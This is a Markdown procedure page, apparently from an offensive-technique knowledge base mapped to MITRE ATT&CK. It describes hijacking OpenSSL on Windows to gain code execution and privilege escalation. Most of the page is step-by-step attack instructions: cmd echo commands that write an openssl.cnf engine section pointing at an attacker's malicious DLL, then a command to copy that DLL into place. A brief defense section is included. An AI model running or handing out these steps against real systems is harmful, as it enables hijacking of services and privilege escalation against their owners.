---
tags:
  - config-injection
  - rce
  - dll-injection
  - openssl
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/create-malicious-openssl-cnf]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Dynamic-link Library Injection]]'
updated_at: '2025-12-14T17:26:17.498Z'
sub_techniques: []
id: 0ee505d7-8c5c-45b4-9e42-70a1724e0fca
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Dynamic-link Library Injection]]'
---
# Modify OpenSSL Configuration for Malicious Engine

## Summary

This procedure creates or modifies the openssl.cnf file in the vulnerable OPENSSLDIR to load a malicious engine library, enabling arbitrary code execution when OpenSSL is invoked.

## Description

By placing a custom config with an 'engine' section referencing a DLL (e.g., malicious.dll with payload), attackers hijack OpenSSL's initialization. This leads to DLL loading and RCE in the context of the calling process, often escalating privileges in services.

## Requirements

1. Writable OPENSSLDIR (from prior step)
2. Malicious DLL prepared (e.g., via Visual Studio with code exec payload like spawning cmd.exe)
3. Command prompt access

## Defense

Defensive measures and detection strategies:

- Validate and sign OpenSSL configs; use read-only for OPENSSLDIR
- Scan for unexpected .cnf modifications with file integrity monitoring (e.g., Sysmon)
- Block dynamic engine loading via OpenSSL build flags

## Objectives

1. Inject config to load malicious DLL
2. Set up for RCE on OpenSSL trigger
3. Achieve privilege escalation via service context

## Instructions

### Step 1: Generate Malicious Config File

**Context**: Write openssl.cnf with engine directives pointing to attacker-controlled DLL.

**Command** ([[commands/create-malicious-openssl-cnf]]):
```cmd
echo [openssl_init] > C:\usr\local\ssl\openssl.cnf
echo engines = engine_section >> C:\usr\local\ssl\openssl.cnf
echo [engine_section] >> C:\usr\local\ssl\openssl.cnf
echo dynamic_path = C:\path\to\malicious.dll >> C:\usr\local\ssl\openssl.cnf
echo dynamic_id = malicious_engine >> C:\usr\local\ssl\openssl.cnf
```

> Replace C:\path\to\malicious.dll with actual DLL location. The DLL must implement OpenSSL engine interface with malicious init code.

### Step 2: Place Malicious DLL

**Context**: Ensure the referenced DLL is in place and executable.

**Command** (built-in copy):
```cmd
copy malicious.dll C:\path\to\malicious.dll
```

> Success if no errors; DLL loads on config read.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow
- [[Dynamic-link Library Injection]] Dynamic-link Library Injection

### Sub-Techniques


## Commands Used

- [[commands/create-malicious-openssl-cnf]]

## Tools Used


## Tags

- [[config-injection]]
- [[rce]]
- [[openssl]]
